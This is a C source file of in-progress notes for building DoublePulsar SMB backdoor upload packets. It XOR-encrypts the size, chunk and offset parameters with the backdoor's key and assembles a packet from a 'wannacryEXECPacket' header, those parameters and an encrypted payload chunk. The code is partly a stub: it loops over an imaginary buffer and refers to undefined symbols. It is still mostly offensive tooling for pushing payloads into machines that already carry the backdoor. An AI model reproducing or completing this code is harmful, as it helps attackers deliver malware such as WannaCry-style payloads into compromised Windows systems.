
//most recent code update that appears to work

//Sources used: https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html

/*
sample function to loop through imaginary buffer
this function seems to work
will update it with the real memory buffer & send / recv commands
*/

void loop_through_buffer()
{

//sample payload size
	unsigned int total_payload_size = 0x507308;

//sample XOR key
	unsigned int Key = 0x58581162;
  
  //encrypted parameters here
	unsigned int p_size = 0x507308 ^ Key;
	unsigned int c_size = 4096 ^ Key;
	unsigned int o_offset = 0 ^ Key;

//buffer to hold our parameters
	char Parametersbuffer[12];

	int i;
  int ctx = 0; //counter

	unsigned int v19 = int(total_payload_size);
	unsigned int v9 = v19 / 4096;
	unsigned int v10 = v19 % 4096;
	unsigned int bytesLeft = int(total_payload_size);

	printf("Iterations:  %d\n", v9);

	int loop_counter = 0;
	if (v19 / 4096 > 0)
	{
		for (ctx = 0; ctx < v19;)
		{
			if (bytesLeft < 4096)
			{
				break;
			}
			o_offset = ctx ^ Key; //update offset by ctx ( +4096 ) every loop
      
      //copy the new parameters
			memcpy(Parametersbuffer, (char*)&p_size, 4);
			memcpy(Parametersbuffer + 4, (char*)&c_size, 4);
			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);

			printf("PARAMETERS: ");

			for (i = 0; i < 12; i++)
			{
				printf("0x%x ", Parametersbuffer[i]);
			}
			printf("\n");
      
      //update counter + 4096 bytes
			ctx += 4096;
      
      //decrease the bytesLeft variable by 4096
			bytesLeft -= 4096;
			printf("[LOOP COUNT %d]:  Bytes left:  %d\n", loop_counter, bytesLeft);
			loop_counter += 1;
		}
	}
	if (v10 > 0)
	{
		printf("Last packet!  Bytes Left = %d\n", bytesLeft);

		c_size = bytesLeft ^ Key; //update count size to the last bytes to upload
		o_offset = ctx ^ Key; //update offset counter to the latest value before the break
		memcpy(Parametersbuffer, (char*)&p_size, 4);
		memcpy(Parametersbuffer + 4, (char*)&c_size, 4);
		memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);

		printf("PARAMETERS: ");

		for (i = 0; i < 12; i++)
		{
			printf("0x%x ", Parametersbuffer[i]);
		}
	}
  
  //sample taken from the last byte and verifying that the value = correct expected value
  //this works :)
	unsigned int lastByte = 0x5858126a ^ 0x58581162;
	printf("\n Last bytes left:  0x%x\n", lastByte);
	printf("Last bytes left in integer:  %d\n", int(lastByte));
}





/*
Below code is just notes & testing.
*/


#define byteswap32(value)		\
((((value) & 0xFF000000) >> 24) | (((value) & 0x00FF0000) >> 8) | (((value) & 0xFF00) << 8) | (((value) & 0xFF) << 24))


void DoublePulsar_Session_Setup_Parameter_Generator()
{
unsigned int TotalSizeofPayload = DLL + Shellcode + EXE_BUFFER_LEN;
unsigned int XorKey = 0x58581162;
unsigned int ChunkSize;
unsigned int OffsetofChunkinPayload;

TotalSizeofPayload = 0x507308 ^ XorKey;
ChunkSize = 0x1000 ^ XorKey;
OffsetofChunkinPayload = 0x1000 ^ XorKey;

unsigned int swapped_TotalSizeofPayload = byteswap32(TotalSizeofPayload);
unsigned int swapped_ChunkSize = byteswap32(ChunkSize);
unsigned int swapped_OffsetofChunkinPayload = byteswap32(OffsetofChunkinPayload);

char swapped_TotalSizeofPayload_PARAMETERS[5];
char swapped_ChunkSize_PARAMETERS[5];
char swapped_OffsetofChunkinPayload_PARAMETERS[5];

memcpy((char*)&swapped_TotalSizeofPayload_PARAMETERS, (char*)&swapped_TotalSizeofPayload, 4);
memcpy((char*)&swapped_ChunkSize_PARAMETERS, (char*)&swapped_ChunkSize, 4);
memcpy((char*)&swapped_OffsetofChunkinPayload_PARAMETERS, (char*)&OffsetofChunkinPayload, 4);

unsigned char SESSION_SETUP_PARAMETERS[12];
SESSION_SETUP_PARAMETERS[0] = swapped_TotalSizeofPayload_PARAMETERS[0];
SESSION_SETUP_PARAMETERS[1] = swapped_TotalSizeofPayload_PARAMETERS[1];
SESSION_SETUP_PARAMETERS[2] = swapped_TotalSizeofPayload_PARAMETERS[2];
SESSION_SETUP_PARAMETERS[3] = swapped_TotalSizeofPayload_PARAMETERS[3];
SESSION_SETUP_PARAMETERS[4] = swapped_ChunkSize_PARAMETERS[0];
SESSION_SETUP_PARAMETERS[5] = swapped_ChunkSize_PARAMETERS[1];
SESSION_SETUP_PARAMETERS[6] = swapped_ChunkSize_PARAMETERS[2];
SESSION_SETUP_PARAMETERS[7] = swapped_ChunkSize_PARAMETERS[3];
SESSION_SETUP_PARAMETERS[8] = swapped_OffsetofChunkinPayload_PARAMETERS[0];
SESSION_SETUP_PARAMETERS[9] = swapped_OffsetofChunkinPayload_PARAMETERS[1];
SESSION_SETUP_PARAMETERS[10] = swapped_OffsetofChunkinPayload_PARAMETERS[2];
SESSION_SETUP_PARAMETERS[11] = swapped_OffsetofChunkinPayload_PARAMETERS[3];

memcpy((char*)&big_packet, (char*)wannacryEXECPacket, 70);
memcpy((char*)&big_packet + 70, (char*)&SESSION_SETUP_PARAMETERS, 12);
memcpy((char*)&big_packet + 82, (char*)&encrypted+ctx, 4096);
}
